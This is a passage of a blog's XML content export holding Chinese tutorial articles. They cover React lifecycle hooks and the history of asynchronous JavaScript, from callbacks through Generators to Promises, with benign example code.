&#123;active: false&#125;; &#125;&#125; componentWillMount用于在组件装载前调用一次，在这个方法里面调用 this.setState 不会导致重渲。 componentWillMount 方法是服务端渲染唯一调用的生命周期钩子，所以有做同构的页面要注意不要在这个方法里面使用有关浏览器的方法，比如 window，document 等。也不要在这个方法发起 http 请求。 render没什么好说的，渲染对象。 componentDidMount在组件挂载后立即执行，此时可以操作 DOM，ajax 请求也主要在这个钩子函数发起。使用 setState 会导致重渲。 生存期 进入存活期后，可能服务端数据下载下来了，发生组件更新；或者在页面交互过程中更更新组件，涉及的生命周期方法如下： componentWillReceiveProps若父组件传递的 props “发生变化”，会调用此函数。主要用于更新 this.state。 “发生变化”之所以加上双引号是因为无论父组件传递的 props 是否发生改变，只要父组件进行了 render，就会出发子组件的 componentWillReceiveProps。 shouldComponetUpdate当收到新的 props 或 state 时，会调用此函数，用于告诉 react 是否需要重新 render。因此可以基于此进行一些 react 性能优化。默认都返回 true。 初始化渲染 使用 forceUpdate 以上两种情况都不会调用 shouldComponentUpdate。 componentWillUpdate在 shouldComponentUpdate 之后，render 之前会调用次函数。此时的 state 已经是更新后的 state。不能在此函数上调用 this.setState 容易造成死循环。 render组件渲染 componentDidUpate在组件更新后马上调用，可以进行一些 DDM 操作。 注意，也不能在此方法上使用 this.setState，避免造成死循环。 销毁期 componentWillUnmount在组件销毁前调用，主要用来做一些清理工作。例如： 取消定时器 解绑 DOM 事件 react16 新增 componentDidCatch在子组件发生未捕获错误时触发。作用： 向服务器发送错误报告 返回新组件代替错误组件]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js 异步进化史之回调]]></title>
    <url>%2Fjs%E5%BC%82%E6%AD%A5%E8%BF%9B%E5%8C%96%E5%8F%B2%E4%B9%8B%E5%9B%9E%E8%B0%83%2F</url>
    <content type="text"><![CDATA[人类在代代相传中不断进化，世间万物很多都是如此，已不断适应赖以生存的环境 。物竞天择，有些适应不了新生环境的自然就会逐渐被淘汰。编程语言也一样，大到整个编程语言的版本升级，小到语言内部一些特性的升级。今天我们就来看看 js 语言的异步进化过程。 什么是异步？ 很多人将“异步”和“并行”混淆在一起，比如： 1234567891011let data1 = ajax("http://example.com?index=1", function success(data) &#123; console.log(data)&#125;);let data2 = ajax("http://example.com?index=2", function success(data) &#123; console.log(data)&#125;);function func(cb) &#123; cb(); console.log('我是同步函数，会不间断运行^_^')&#125; 说这两个 ajax 请求是并行的可能是对的，因为它们可能几乎是同一时间发送出去的。 注：由于某些原因的限制，比如当采用 http/1.x 的时候，受到浏览器的最大连接数的限制。在这里我们暂且认为它们是并行的。 从另外一个视觉分析，我们单单分析第一个 ajax 请求，它不是马上得到响应的，data1 会是 undefined，success 方法也不会马上得到执行，而是过一个时间间隙后，服务器返回了数据。再对 success 方法进行调用。明显有一个时间间隔，不会像 func 一样一口气执行完。 所以，不要将“异步”和“并行”混淆在一起，并行指的是同一时间执行多个程序块，而异步是指，“现在”执行一部分，待“将来”条件满足了再执行另外一部分。“现在”和“将来”有一个时间间隙。两者概念不同。 为什么要异步？ 有目的做事才有方向的嘛，那为什么要异步呢？ 当客户端发起一个 ajax 请求，不采用异步的方式处理，而是采用同步等待的处理方式。因为 js 的单线程特性，同步等待会阻塞当前线程，从而导致客户端不能响应用户的其他操作，甚至页面上的小动画也停了，彷佛世界末日。 注：js 之所以采用单线程，是因为多线程编程是非常复杂的。至于为什么复杂，已是题外话，请自行 google。 所以异步就被需要需要了。当你发起 ajax 请求的时候，先把当前程序块“挂起”，客户端先处理其他用户交互，等服务器响应数据到了，在回过头来继续执行之前的“挂起”的程序块。 123ajax("http://example.com?index=1", function success(data) &#123; console.log(data); // 获取到服务器响应的数据&#125;); 那么异步的代码块又是如何在恰当的时候放入 js 引擎中解析执行的呢？事件循环 事件循环 什么是事件循环呢？我们用一段伪代码来诠释一下这个概念： 1234567891011const eventLoop =[];while(true) &#123; if (eventLoop.length &gt; 0) &#123; const event = eventLoop.shift(); try &#123; event(); &#125; catch(err) &#123; console.log(err); &#125; &#125;&#125; 就是这么一个概念，不断取出队列里面的事件（如果有的话）放入 js 引擎执行。每一次循环称为，tick。 但是队列里面的事件哪里来呢？程序通常是分成很多小的块，放入事件循环队列中一个个被执行的。比如： 123setTimeout(function time() &#123; console.log("嗨! 我将在 1 秒后被调用");&#125;, 1000) 在到了 1000ms 后，宿主环境就会将回调函数放入（此时异步是通过回调实现的）事件队列中。又例如，客户端发起 ajax 请求，宿主环境监听到服务器响应到来后，将回调函数放入事件队列等待执行。 但是有个问题，如果此时事件队列中有 10 个事件等待执行。那么 setTimeout 的回调函数就不会得到立即执行。这也是 setTimeout 的精确度不高的原因。 这也是下面的代码调用 setTimeout 1000 次，不会 1000 马上一起执行的原因，需要一个一个来: 12345for(let i = 0; i &lt; 1000; i++) &#123; setTimeout(function time() &#123; console.log("嗨! 我又来了"); &#125;, 0)&#125; 什么是回调？ 说了这么多，终于轮到了我们今天的主角回调。 js 最原始的执行异步的操作即是：回调。也就是说，将需要异步执行的代码，封装进一个函数中，待到执行的时机成熟，将此函数放入事件循环中。此函数就叫：异步回调函数。 其他的我们就不管了，为了简单，这里将异步回调函数，简称：回调。 你懂了没？ 反正我是有点云里雾里😔 直接上代码吧： 1234567891011121314// success 是一个回调ajax("http://example.com?index=1", function success(data) &#123; console.log(data);&#125;);// func 是一个回调setTimeout(function func() &#123; console.log('hello')&#125;, 1000)// clickEvent 是一个回调$.on('click', function clickEvent() &#123; console.log('click');&#125;, false) 回调问题之回调地狱 上面的代码挺好的看起来没什么问题呀？ 那我们来看看这个： 12345678910// 假设有这么个依赖关系的 api 请求function request() &#123; ajax("http://example.com", function cb1(index) &#123; ajax("http://example.com?index=" + index, function cb2(data) &#123; ajax("http://example.com?data=" + data, function cb3() &#123; console.log('ok'); &#125;) &#125;) &#125;)&#125; 这就形成了社区人闻风而逃的回调地狱。这只是一个简单的模拟，真实情况下，各个函数内部还会包含各种各种的业务逻辑代码。如果中间有什错误调试也极其困难。因为我们的大脑分析事物是按顺序一个个进行的，而分析这种代码，我们的大脑需要跳来跳去，理解难度增大。 有人不服了，把它们拆分出来不久行了嘛？ 好！ 12345678910111213141516171819202122// 假设有这么个依赖关系的 api 请求function request() &#123; getIndex();&#125;function getIndex() &#123; ajax("http://example.com", function cb1(index) &#123; getData(index); &#125;)&#125;function getData(index) &#123; ajax("http://example.com?index=" + index, function cb2(data) &#123; generatorResult(data) &#125;)&#125;function generatorResult(data) &#123; ajax("http://example.com?data=" + data, function cb3() &#123; console.log('ok'); &#125;)&#125; 虽然看起来是顺序了点，但是本质问题还是没有改变，现实中的代码也不可能这样干净，还会有很多其他业务代码参杂在里面，你有时候甚至不知道这是异步调用还是同步调用。 借用 Kyle Simpson 大神的一段代码： 12345678doA(function() &#123; doB(); doC(function() &#123; doD(); &#125;); doE();&#125;);doF(); 你能一眼看出这段代码的执行顺序嘛？ 回调问题之信任问题 回调还有信任问题？ 当然，如果你跟第三方接口合作过的话，例如： 12345function callback() &#123; // do something&#125;thirdAPI(callback) 然后我问你，callback 什么时候会执行？ 不知道～ callback 会出现什么异常吗？ 不知道～ callback 会被调用吗？ 不知道～ …. 相当于把代码扔进了一个黑盒，发生什么你无法知道，也无法控制（或者说难以控制，因为你不知第三方会给你一个怎么样的运行环境，难以作出相应的应对策略）。直到有天老板找上门，为什么有客户举报说：购买了我们一次服务，我们扣了客户 5 次钱。然后又是一个凌晨四点钟的夜晚。 第三方的有问题，那自己写的就保证没问题吗？ 还真不一定： 12345678const res = [];ajax("http://example.com?index=0", function success(data) &#123; res.push(data);&#125;);ajax("http://example.com?index=1", function success(data) &#123; res.push(data);&#125;); 你能保证 res[0] 存的一定是 index=0 的结果吗？如果 index=1 先响应呢？ 这还不简单吗，改成这样不就完事了？ 12345678const res = [];ajax("http://example.com?index=0", function success(data) &#123; res[0] = data;&#125;);ajax("http://example.com?index=1", function success(data) &#123; res[1] = data;&#125;); 好，现在是解决了顺序问题，那么我怎么判断两个 ajax 都回来了呢？ res[0] &amp;&amp; res[1] ? 如果我原本 res 有初始值呢？ 好了，这并不是一个优雅的方案。总的来说会有以下 6 个问题： 调用过早 调用过晚 回调未调用 调用次数过多或过少 未能传递参数/环境值 吞掉错误或异常 总结 采用回调处理异步，会有两个问题： 会造成回调地狱，不适合我们大脑的工作方式 会有信任问题 那么如何解决呢？ 请看下回分析：js异步进化史之Promise]]></content>
      <categories>
        <category>异步</category>
      </categories>
      <tags>
        <tag>回调</tag>
        <tag>事件循环</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js 异步进化史之Generator]]></title>
    <url>%2Fjs%E5%BC%82%E6%AD%A5%E8%BF%9B%E5%8C%96%E5%8F%B2%E4%B9%8BGenerator%2F</url>
    <content type="text"><![CDATA[在介绍 Generator 和异步的关系之前，我们先分析下 Generator。看看它给我们带来了什么惊奇的表现。 下文将会按照这个顺序逐步解析 Genenrator: 什么是 Generator? Generator 和 iterator Generator 和 异步 相信看完下文后，再回过头来看上图 yield 是多么贴切😊 什么是 Generator? 在 Generator 之前，js 的函数是一个最小执行单位，一旦开始运行，就会运行到结束，期间不会有其他代码能够打断并插入其间。 123456789101112let a = 1;function foo() &#123; console.log(a); // 想在这里暂停一下，先对 a 执行一下其他算数操作，再进行下一步 console.log(a);&#125;function main() &#123; // 要么提前对 a 操作 foo(); // 要么延迟对 a 操作&#125; 像上面这样的普通函数，我们是没有办法对其进行中断的，foo 函数打印的两个 a 始终会一样。 虽然很容易通过其他方式实现上述需求，但是我就是这么任性，就要在两个 console 之间暂停，怎么办呢？ Generator 犹如周星驰上赌场，风流潇洒的进入了我们的视野～ 12345678910111213141516let a = 1;function *foo() &#123; console.log(a); yield; // 在这里暂停 console.log(a);&#125;function main() &#123; // 构造一个 iterator 控制整个 generator let it = foo(); it.next(); a ++; it.next();&#125;main(); // 输出 1, 2 细心的同学可能发现了 foo 函数的一些变化（发现的不了的是有多粗的心呀～ foo 函数前面多了一个 * 符号，并且两个 console 语句之间多了一个 yield 语句。main 中 foo 的执行也有了很大改变。不急我们从 main 函数的执行开始一步一步来分析： it = foo()，并没有执行生成器 *foo()，而是构造了一个 iterator，由这个 iterator 控制生成器的执行； 第一条 it.next() 语句启动生成器 *foo()，并执行第一条 console.log(a) 语句，此时 a = 1； 生成器 foo() 遇到 yield 语句停止，并且在这点上，第一条 it.next 语句停止。此时 foo() 仍在运行并且是活跃的，但处于暂停状态； 执行语句 a ++，此时 a = 2； 执行第二条 it.next() 语句，*foo() 生成器从暂停恢复执行，执行第二条 console.log(a) 此时输出 2； 因此可以看出 Generator 函数是一类特殊的函数，可以在一处或多处暂停，并且不一定要执行完。 注：Generator 函数有三种写法：function foo()、function\ foo()、 function*foo()。喜欢那种都没有关系，坚持一种风格就可以了，下文将采用第一种。 输入与输出我我我… 我什么我，直接看代码 12345678function *foo() &#123; const x = yield; console.log(x);&#125;const it = foo();it.next(); // 运行到 yield 语句暂停it.next(2); // console 将输出 2 可以通过 next() 方法向 Generator 函数内部传递值。 注意第一个 next() 不接受任何参数，即使传参数进去也会被忽略，因为没有相应的 yield 受理 再看看输出 12345678function *foo() &#123; const x = yield 1; console.log(x); // 2&#125;const it = foo();console.log(it.next()); // &#123;value: 1, done: false&#125;console.log(it.next(2)); // &#123;value: undefined, done: true&#125; 可以看出 next 方法返回一个对象，包含 value、done 两个字段 value: iterator 返回的任意 javascript 值 done: 表示是否遍历到 iterator 的末端，是的话 done 为 true, 否则 false 那么第二个 it.next() 语句的 value 为什么是 undefined? 因为最后一个 next 的 value 值为函数的返回值（return），默认返回值 undefined 错误处理真正健壮的代码是需要完善的错误处理机制的，Generator 也不例外： 123456789101112131415function *foo() &#123; try &#123; const x = yield 1; console.log(x); &#125; catch(err) &#123; console.log(err); // 不会执行 &#125;&#125;const it = foo();try &#123; it.throw('generator Erorr')&#125; catch(err) &#123; console.log(err + ' outer'); // 执行&#125; 因为 *foo() hai 没有启动，就抛出错误，只能从函数外部进行错误捕获。 1234567891011121314151617181920212223242526272829303132333435363738function *foo() &#123; try &#123; const x = yield 1; console.log(x); &#125; catch(err) &#123; console.log(err); // 执行 &#125;&#125;const it = foo();it.next();try &#123; it.throw('generator Erorr')&#125; catch(err) &#123; console.log(err + ' outer'); // 不执行&#125;/*+++++++++++++++++++++++++++++++++++++++++++++++++++*/function *foo() &#123; try &#123; const x = yield 1; console.log(x); &#125; catch(err) &#123; console.log(err); // request error &#125;&#125;const it = foo();it.next();function request() &#123; ajax('http://example.com', function(err, data) &#123; it.throw('request error'); &#125;)&#125; 抛入 Generator 里面的错误，可以由内部捕获，异步也一样 12345678910111213function *foo() &#123; const x = yield 1; console.log(x);&#125;const it = foo();it.next();try &#123; it.throw('generator Erorr')&#125; catch(err) &#123; console.log(err + ' outer'); // 执行 generator 没有捕获的往外抛出&#125; 多个 iterator不知道各位同学有没有注意到上文的一个细节，我写 Generator 都是用大写（ js 编程习惯，类首字母大写）。因为我们 Generator 也跟类类似，每生成一个 iterator 相当于生成一个该 Generator 的实例。来玩一个好玩的： 1234567891011121314151617181920212223242526let a = 1;let b = 1;function *foo() &#123; a++; yield; b = a + b; yield; b *=b; yield; console.log(a, b); return 0;&#125;const it1 = foo();const it2 = foo();it1.next(); // a = 2; b = 1;it1.next(); // a = 2; b = 3;it1.next(); // a = 2; b = 9;it1.next(); // 2, 9;it2.next(); // a = 3; b = 9;it2.next(); // a = 3; b = 12;it2.next(); // a = 3; b = 144;it2.next(); // 3, 144 好了， 到目前没什么问题，让我们换换顺序： 1234567891011it1.next(); // a = 2; b = 1;it2.next(); // a = 3; b = 1;it1.next(); // a = 3; b = 4;it2.next(); // a = 3; b = 7;it1.next(); // a = 3; b = 49it2.next(); // a = 3; b = 49 * 49it1.next(); // 3, 49it2.next(); // 3, 49 * 49 只要安排的合理，换换执行顺序就能得到不同的值。这还是只有两个实例，更多实例呢？*foo() 设计的更巧妙呢？把输入，输出加上去呢？ 不止一个 Generator 共享数据呢？感觉可以出个脑力游戏了，哈哈 那到底 iterator 是怎么一个机制呢？下面一起来看看 Generator 和 iterator iterator 是 ES6 提出来的一个新概念，定义了 iterator 的 Object 可以被 for…of 循环使用。 现在有一个要求，要你打印斐波那契数列（前面两位数相加，作为第三位数 1,1,2,3,5,8…..），你很可能很快写出下列代码 123456789101112131415161718192021const func = (function() &#123; let val1 = 0; let val2 = 0; return function () &#123; if (val1 === 0 &amp;&amp; val2 === 0) &#123; val2 = 1; return 1; &#125; let result = val1 + val2; val1 = val2; val2 = result; return result; &#125;&#125;)();console.log(func()); // 1console.log(func()); // 1console.log(func()); // 2console.log(func()); // 3console.log(func()); // 5console.log(func()); // 8 要一个一个执行有点麻烦呀，我们来改改： 123456789101112131415161718192021222324252627282930const func = (function() &#123; let val1 = 0; let val2 = 0; return &#123; [Symbol.iterator]: function() &#123;return this;&#125;, next: function() &#123; if (val1 === 0 &amp;&amp; val2 === 0) &#123; val2 = 1; return &#123; value: 1, done: false &#125;; &#125; let result = val1 + val2; val1 = val2; val2 = result; return &#123; value: result, done: false &#125;; &#125; &#125;&#125;)();for(let v of func) &#123; console.log(v); if (v &gt; 50) &#123; break; &#125;&#125; // 1, 1, 2, 3, 5, 8, 13, 21, 34, 55 for…of 循环会每次去调用 next()，直到 done 为 true。上面的代码其实就是一个 iterator，因为它的接口中有一个 next 方法。 既然我们生成器也是返回的也是 iterator ，我们再来改改上面的代码： 123456789101112131415161718192021function *func() &#123; let val1 = 0; let val2 = 0; while(true) &#123; if (val1 === 0 &amp;&amp; val2 === 0) &#123; val2 = 1; yield val2; &#125; let result = val1 + val2; val1 = val2; val2 = result; yield result; &#125;&#125;for(let v of func()) &#123; console.log(v); if (v &gt; 50) &#123; break; &#125;&#125; // 1, 1, 2, 3, 5, 8, 13, 21, 34, 55 是不是优雅很多 😊 但是像上面的代码 while(true)，我们是不是没有办法停止 Generator 了？ 有，我们一起来看看 停止 Generator上面的例子中 break 之后，iterator 貌似就处于永远挂起状态了。实际上，for…of 循环发生“异常结束”（提前终止），通常由 break、return 或者未捕获异常引起，会向 Generator 的 iterator 发送一个信号使其终止。 可以这样用： 1234567const it = func();for(let v of it &#123; console.log(v); if (v &gt; 50) &#123; it.return('hello world'); &#125;&#125; 如果在 Generator 内有 try…finally 语句，它将总是运行，即使生成器外部结束。如果需要清理资源的话（数据库连接等），这一点非常有用 123456789101112131415161718function *func() &#123; try &#123; let val1 = 0; let val2 = 0; while(true) &#123; if (val1 === 0 &amp;&amp; val2 === 0) &#123; val2 = 1; yield val2; &#125; let result = val1 + val2; val1 = val2; val2 = result; yield result; &#125; &#125; finally &#123; // 做清理工作 &#125;&#125; 不是说好我们今天的主题是 Generator 和异步嘛？怎么看了半天，异步的影子都没见着？ 不急不急，磨刀不误砍柴工嘛。 action! Generator 和 异步 其实我们上面已经稍微提到了 Generator 和 异步。 过去半个世纪了谁还记得呀？哼！ 好吧～，我的锅 12345678910111213141516171819function *foo() &#123; try &#123; const text = yeild; console.log(text); &#125; catch(err) &#123; console.log(err); &#125;&#125;const it = foo();it.next();ajax('http://example.com', function(err, data) &#123; if (err) &#123; it.throw(err); &#125; else &#123; it.next(data); &#125;&#125;) 前面介绍 Generator 错误处理的时候，已经说明了可以 Generator 捕获异步异常是不是很棒？ 还有，仔细看看前面对的代码，看似同步执行，实际上却可以异步，是不是更加棒棒？ Generator 和 Promise既然 Promise 能够解决回调的信任的问题，不清楚建议先看看js 异步进化史之Promise，我们将 Generator 与 Promise 结合起来看看 1234567891011121314151617181920212223242526272829function request(url) &#123; return new Promise(function(resolve, reject) &#123; ajax(url, function(err, data) &#123; if (err) &#123; reject(err); &#125; else &#123; resolve(data); &#125; &#125;) &#125;)&#125;function *foo(url) &#123; try &#123; const text = yeild request(url); console.log(text); &#125; catch(err) &#123; console.log(err); &#125;&#125;const it = foo();it.next().value .then(function(data) &#123; it.next(data); &#125;, function(err) &#123; it.throw(err); &#125;) 是不是优雅了很多？不仅解决了 Promise 处理错误的问题，还以更同步的方式编写异步代码。 但是还有个小小的遗憾，then 还是要我们手动调用。如果有什么能够自动处理 then 就好了。 还真有，请看这个缩小版： 123456789101112131415161718function run(gen) &#123; let args = [].slice.call(arguments, 1); let it = gen.apply(this, args); return Promise.resolve().then(function handleNext(value) &#123; let next = it.next(value); return (function handleResult(next) &#123; if (next.done) &#123; return next.value; &#125; else &#123; return Promise.resolve(next.value) .then(handleNext, function handleError(err) &#123; return Promise.resolve(it.throw(err)) .then(handleResult); &#125;) &#125; &#125;)(next); &#125;)&#125; 然后我们的代码就变成了 12345678910function *foo(url) &#123; try &#123; const text = yeild request(url); console.log(text); &#125; catch(err) &#123; console.log(err); &#125;&#125;run(foo, 'http://example.com'); 简直逆天了～，异步代码同步写呀 如果你用 co 库，那么上面的代码你会非常熟悉 Generator 委托至今为止，我们还没有试过在 Generator 里面调用 Generator，如果调用会发生什么呢？ 12345678910111213function *foo(url) &#123; let r1 = request('http://example.com?index1'); let r2 = request('http://example.com?index2'); return r2;&#125;function *bar() &#123; let r2 = run(foo); let r3 = request('http://example.com?index3'); console.log(r2);&#125;run(bar); 你可能会问真的需要使用两次 run 函数吗？不能像普通函数一样，直接一个调用另外一个吗？ 可以的，小伙子你很聪明 12345678910111213141516171819202122function *foo() &#123; yield 'B'; yield 'C'; return 'D';&#125;function *bar() &#123; yield 'A'; let result = yield *foo(); console.log(result + ' return to bar'); yield 'E'; return 'F';&#125;const it = bar();console.log(it.next().value); // Aconsole.log(it.next().value); // B 此处 it 已经委托到 fooconsole.log(it.next().value); // Cconsole.log(it.next().value); // E // D return to barconsole.log(it.next().value); // F 上面这种 iterator 的转换称为 Generator 委托。 事件也可以委托，🆒 1234567891011121314151617181920212223function *foo() &#123; try &#123; yield 'B'; &#125; catch(err) &#123; console.log(err); // foo error &#125; yield 'C'; return 'D';&#125;function *bar() &#123; yield 'A'; let result = yield *foo(); console.log(result + ' return to bar'); yield 'E'; return 'F';&#125;const it = bar();console.log(it.next().value); // Aconsole.log(it.next().value); // B 此处 it 已经委托到 fooit.throw('foo error'); 然后我们刚开始的代码就可以改为只需要使用一次 run： 12345678910111213function *foo(url) &#123; let r1 = request('http://example.com?index1'); let r2 = request('http://example.com?index2'); return r2;&#125;function *bar() &#123; let r2 = *foo(); let r3 = request('http://example.com?index3'); console.log(r2);&#125;run(bar); 总结 Generator 已经可以让我们实现以同步的方式编写异步代码了，但是有个小小遗憾，就是要额外引入 Generator 库，例如 co： 1234567const co = require('co');co(function* ()&#123; let text = yield requst('http://example.com') console.log(text);&#125;).catch(err =&gt; &#123; console.log(err);&#125;); 而且还多了 co～ 很好有极致的编程思维 ES 工作组的大佬们也早已洞察到了这一点，于是在 ES7 上添加了更为强大的异步工具 async/await 请看下一篇：js异步进化史之async]]></content>
      <categories>
        <category>异步</category>
      </categories>
      <tags>
        <tag>Generator</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js 异步进化史之Promise]]></title>
    <url>%2Fjs%E5%BC%82%E6%AD%A5%E8%BF%9B%E5%8C%96%E5%8F%B2%E4%B9%8BPromise%2F</url>
    <content type="text"><![CDATA[在上一篇 js 异步进化史之回调 我们了解到基于回调处理异步问题存在一些缺陷。那么 Promise 是什么？能够解决回调造成的问题吗？又会不会引入新的问题？下面我们一起来分析一下。 什么是 Promise? Promise 英文意思：承诺。嗯，一看就觉得靠谱！ Promise 只有三种状态：未决议、resolve、reject，并且一旦决议，状态不可在更改。只能由未决议 &gt; resolve，或 未决议 &gt; reject，两条状态转换路线，不能逆转，resolve 也不能转为 reject。如图： 小时候有玩过鞭炮的小朋友可以会想到，未决议状态不就像点燃鞭炮一样吗？要么成功爆炸(resolve)，要么是哑炮(reject)。 没错，就是这样，但是我还是不明白 Promise 是什么？ 好吧，我们继续，你会明白的~ I promise! 理解 Promise 我们先放下对 Promise 概念的纠结，首先想想这两个问题： es6 提供的 Promise 基于底层实现的那些改变，能否通过回调等其他机制进行模拟？ Promise 是为了解决什么问题而出现的？ 不急，我们一个一个问题来处理～ es6 之任务队列在 es6 中新增了一个名为任务队列的概念，该队列建立于事件循环队列之上。而 Promise 的异步特性正是基于任务队列。事件循环队列我们在js 异步进化史之回调已经介绍过，这里不在赘述，我们来详细分析下任务队列。 大家来看看这段代码输出顺序是什么？（先有自己的答案再往下看） 123456789101112setTimeout(function() &#123; console.log('A');&#125;, 0);Promise.resolve(1).then(function() &#123; console.log('B'); Promise.resolve(1).then(function() &#123; console.log('C'); &#125;);&#125;);console.log('D'); 正确顺序是 D &gt; B &gt; C &gt; A 为什么？因为任务队列是建立在事件循环队列上的队列，也就是说….算了我也说不清，上图上图 也就是说，js 引擎会优先处理任务队列的任务，直到任务任务队列为空才转而执行事件循环队列的事件。所以理论上说，任务循环可能会导致无限循环，进而导致程序饿死，无法转移到下一个事件循环 tick。 注：这里主要为了方便理解，真实情况不是这样的，其实一个浏览器环境只能有一个事件循环，而一个事件循环可以多个任务队列，每个任务都有一个任务源）。相同任务源的任务，只能放到一个任务队列中。不同任务源的任务，可以放到不同任务队列中。 是不是有种 vip 通道的感觉？【滑稽】 Promise 与 任务队列为什么 Promise 要基于任务队列呢？这样能解决什么问题？ 这是为了满足一些低延迟的异步操作。比如： 123Promise.resolve(2).then(function(data) &#123; console.log(data)&#125;); 这种可以直接同步运行，但是又不得不异步运行的代码，你不希望它排一个长长的事件队列再执行吧？ 为什么说可以同步运行，但又不得不异步运行呢？ 请看： 123456789let a = 0;function boo() &#123; console.log(a);&#125;request('http://example.com', boo);a++; 请问这里打印 0 还是 1？要看情况而定。如果 request 是同步的那么打印 0，如果是异步则打印 1。在真实的开发环境中遇到这种不确定因素会造成极大的麻烦。 怎么办呢？有轻功 123456789101112131415let a = 0;function boo() &#123; console.log(a);&#125;function func() &#123; return new Promise(function(resolve, reject) &#123; request('http://example.com', resolve); &#125;)&#125;func().then(boo);a++; 这样可以永远保证 console 输出为 1 Promise 之并发想必大多数前端工程师都遇到过下面类似的情况吧？ 123456789101112131415let data1, data2;ajax('http://example.com?index=1', function (data) &#123; data1 = data; if (data1 &amp;&amp; data2) &#123; console.log(data1 + data2); // console 依赖于异步结果 data1 和 data2 &#125;&#125;);ajax('http://example.com?index=2', function (data) &#123; data2 = data; if (data1 &amp;&amp; data2) &#123; console.log(data1 + data2); // console 依赖于异步结果 data1 和 data2 &#125;&#125;); 这代码虽然没什么问题，但是看起来总不太优雅，语句 if (data1 &amp;&amp; data2) 存在于两个地方，如有改动，需要两个地方都改。让我们用 Promise 试试： 123456789101112131415161718function request(url) &#123; return new Promise(function(resolve, reject) &#123; ajax(url, function(err, data) &#123; if (!err) &#123; resolve(data); &#125; else &#123; reject(err); &#125; &#125;) &#125;)&#125;const p1 = request('http://example.com?index=1');const p2 = request('http://example.com?index=2');Promise.all([p1, p2]).then(function(data) &#123; console.log(...data);&#125;); 是不是优雅很多😊 Promise 与回调我们在上一篇js 异步进化史之回调中提到过这么一句话： 回调相当于将代码扔进一个黑盒，发生什么你无从得知。当黑盒运行完了它的代码，自动会调用你的回调函数。 而 Promise 却反过来”监听”黑盒的运行情况，”监听”到黑盒运行完了，就马上调用相应的函数。 呃，有点难懂！ 好吧，上代码： 1234567// 第三方 API（thirdAPI)，结束运行后，调用 funcfunction func(err, data) &#123; // do somethind&#125;// 第三方 APIthirdAPI(func) 以上是回调存在的一个信任的问题，我们无法保证第三方 API，在什么环境下调用我们的函数 func，出了错误我们也无法监听，等等一系列问题。（也就是把我们的代码扔进了黑盒） 首先想想我们为什么不能在自己的环境下调用 func 呢？因为我们不知道 thirdAPI 什么时候能够运行完呀，因此不知道该什么时候调用 func 才好。 既然这样，如果我们能够监听到 thirdAPI 运行完，岂不是可以在监听到 thirdAPI 运行完就可以调用我们的 func 了？就像： 1234567891011121314151617181920212223function fulfilled() &#123; // do something&#125;function rejected() &#123; // do something&#125;// 第三方 APIfunction thirdAPI() &#123; ajax(url, function(err, data) &#123; if (err) &#123; listener.emit('rejected', err) &#125; else &#123; listener.emit('fulfilled', data) &#125; &#125;); return listener;&#125;let listener = thirdAPI();listener.on('fulfilled', fulfilled);listener.on('rejected', rejected); 这就非常类似我们的”监听”黑盒功能了，但是要手动实现一个发布订阅模式 listener。 改用 Promise 后： 1234567891011121314151617181920212223function fulfilled() &#123; // do something&#125;function rejected() &#123; // do something&#125;// 第三方 APIfunction thirdAPI() &#123; return new Promise(function(resolve, reject) &#123; ajax(url, function(err, data) &#123; if (err) &#123; reject(err) &#125; else &#123; resolve &#125; &#125;); &#125;)&#125;// nicethirdAPI().then(fulfilled, rejected); Promise 链式流Promise 出来这么久了，即使没有直接用过 Promise，相信也间接用过不少。例如，Fetch 就是基于 Promise 封装的，这块代码你应该很熟悉： 1234567891011fetch('http://example.com?index=1') .then(function(res) &#123; if (res.ok) &#123; return res.json(); &#125; throw "Request Error"; &#125;).then(function(data) &#123; console.log(data); &#125;).catch(function(err) &#123; console.error(err); &#125;); 上面的 then … then … catch 就是 Promise 的链式流。catch 稍后我们在介绍，这里先说下 then。 运行 then 之后会发生什么呢？为什么可以一直 then 下去？ 运行 then 之后，会返回一个 Promise。具体来说是 Promise.resolve(/then 的返回值/) Promise.resolve 的作用: 返回一个以给定值解析后的Promise对象。但如果这个值是个thenable（即带有then方法），返回的promise会“跟随”这个thenable的对象，采用它的最终状态（指resolved/rejected/pending/settled）；否则以该值为成功状态返回promise对象。 这里有个问题，虽然貌似部分解决跟踪回调时，脑子跳来跳去的问题，但是我想说的是 then 也烦呀，虽然没回调烦～。 Promise 错误处理Promise 的错误处理，可以将函数放在 then 的第二个参数上，也可以用 catch 捕获： 12345678910111213141516171819Promise.resolve(1).then(function fulfilled() &#123; // success&#125;, function rejected() &#123; // error&#125;)// 或者Promise.resolve(1).then(function fulfilled() &#123; // success&#125;).catch(function(err) &#123; // error&#125;)// then 的两个参数有默认值Promise.resolve(1).then(function (value) &#123; return value; // 默认将 value 直接返回&#125;，function (err) &#123; throw err; // 默认直接将 err 抛出&#125;) 但是如果 catch 中也发生错误呢？由谁来捕获？所以这也算是 Promise 的一个缺陷。 Promise 适配版当在不支持 Promise 的浏览器器中使用 Promise 时，可以使用相关的适配版，其定义了 Promise 及它的所有相关特性，例如，Native PromiseA。 Promise API 概览 上文已经零零散散展示了一些 Promise API 的用法，下面我们来总结一下。 new Promise(…) 构造器Promise 构造函数接受一个函数作为参数。这个函数是同步调用的，并且接受两个参数（resolve 和 reject）作为回调，由 js 引擎提供，用以 Promise 决议。 12345678new Promise(function(resolve, reject) &#123; console.log('A'); resolve(); console.log('B')&#125;).then(function() &#123; console.log('C');&#125;)console.log('D'); 输出顺序为：A &gt; B &gt; D &gt; C reject 就是拒绝这个 promise，当发生错误或者其他异常的时候，就会调用 reject。 resolve 可能是完成 promise，也可能是拒绝 promise。要视传入的参数而定，当传入的参数为非 promise、非tenable 的立即值，这个 promise 就会用这个值完成。 但是，如果传给 resolve 的值是 promise 或 thenable，这个值将会被递归展开，并且 promise 将取其最终决议值或状态。例如： 1234567891011const errP = new Promise(function(resolve, reject) &#123; throw 'Error Promise';&#125;)new Promise(function(resolve, reject) &#123; resolve(errP);&#125;).then(function() &#123; console.log('完成Promise'); // 不会执行&#125;, function(err) &#123; console.log(err) // Error Promsise&#125;) Promise.reject(…) 和 Promise.resolve(…)Promise.reject 用来创建一个被拒绝的 promise。不管传入什么参数 thenable 也好、promise 也好不会对其进行展开，最终决议都是拒绝。例如： 12345const p1 = new Promise(function(resolve, reject) &#123; reject('some thing');&#125;);const p2 = Promise.reject('some thing');// p1 和 p2 等价 Promise.resolve 